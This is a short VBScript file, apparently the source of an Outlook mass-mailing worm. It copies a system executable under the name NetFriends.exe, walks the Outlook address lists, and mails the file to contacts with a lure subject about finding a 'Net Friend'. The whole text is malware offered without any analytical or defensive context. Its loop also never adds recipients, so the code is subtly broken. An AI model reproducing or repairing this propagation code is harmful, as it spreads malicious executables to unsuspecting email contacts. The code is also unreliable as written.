Set fso=CreateObject("Scripting.FileSystemObject")
fso.Copyfile fso.GetSpecialFolder(1)&"\Iesetup.exe", fso.GetSpecialFolder(1)&"\NetFriends.exe"
Set K = CreateObject("Outlook.Application")
Set L = K.GetNameSpace("MAPI")
For Each M In L.AddressLists
If M.AddressEntries.Count <> 0 Then
For O = 1 To M.AddressEntries.Count
Set P = M.AddressEntries(O)
Next
Set N = K.CreateItem(0)
N.Subject = "Would you like a Net Friend ?"
N.Body = "Look at this zip file to find a Net Friend"
Set Q = CreateObject("Scripting.FileSystemObject")
N.Attachments.Add Q.BuildPath(Q.GetSpecialFolder(1),"NetFriends.exe")
If N.To <> "" Then
N.Send
End If
End If
Next